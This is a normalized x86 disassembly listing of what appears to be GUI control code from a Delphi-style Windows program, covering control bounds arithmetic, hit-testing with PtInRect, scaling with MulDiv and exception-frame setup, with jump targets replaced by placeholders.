pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_435430
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_433b98
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_433ba8
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_434b3c
pop esi
retn
sub_435470
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_434b70
sub_43551e
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_433db8
mov cl 0x1
sub_435560
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_433b10
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_433b10
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_435590
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_4355b4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_4067b8
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_4032ec
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_434b3c
mov [ ebx + 0xc ] eax
sub_435658
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_433a64
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_433a64
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_4356ec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_403038
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_433104
mov edx [ esp ]
mov eax esi
call sub_4330e0
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_43338c
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_4333d0
sub_435770
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_412404
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_433488
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_412454
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_433330
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4357fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_4356ec
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_43a170
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_435770
pop ecx
jmp r-xdata
sub_43585c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43594a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435951
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_4339a0
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_433970
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_433970
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4042b8
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403f00
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_433890
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_435958
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_4032ec
sub_435984
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4359a4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4359c4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4359e4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_435a04
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_435a24
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_435a44
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_419f5c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_432fc4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4032ec
sub_435a7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_435b18
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413f40
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44018c
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_4402c4
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_433970
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_440024
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_4403e4
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435b1f
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_435b28
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_435b64
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_435b28
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_435c14
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_40327c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_435c48
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_435c68
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_4032ec
test al al
je r-xdata
mov eax edi
call sub_435ca8
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_435cd4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_435d00
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_4067b8
mov eax esp
call sub_41247c
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4334b4
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_4032ec
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_4032ec
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_4334e0
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_41247c
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_412404
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_433488
sub_435e28
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_435e68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4326b4
mov eax esi
mov edx [ r-xdata ]
call sub_4032a0
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_435e9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_435f94
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_432a70
push ebx
push sub_43792c
call sub_41ab9c
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d17c
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41d324
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4033fc
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_451260
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403f00
lea eax [ ebx + 0x188 ]
call sub_403eac
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435f9b
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
sub_435f9b
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_435fc0
push ebx
push esi
push edi
call sub_403464
mov ebx edx
mov edi eax
mov eax edi
call sub_419dac
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4054e8
mov eax [ edi + 0x178 ]
call sub_4030f0
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43161c
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_436c60
mov eax edi
call sub_436ea0
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_4030f0
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_436e64
mov esi eax
mov edx esi
mov eax edi
call sub_436ccc
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_436ea0
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_432b48
test bl bl
jle r-xdata
call sub_41ac34
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40344c
sub_436090
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_436154
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_413a58
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_43a330
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413860
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_4139ac
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413860
test eax eax
je r-xdata
sub_436164
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_436a08
xor eax eax
push ebp
push sub_4361a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_432dac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4361ab
mov eax [ ebp - 0x4 ]
call sub_436a10
retn
sub_4361ab
mov eax [ ebp - 0x4 ]
call sub_436090
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_437864
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_434b3c
sub_4361e0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_4361fb ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_43626c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43a474
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_412404
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_4365ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4365f4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_436502 ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
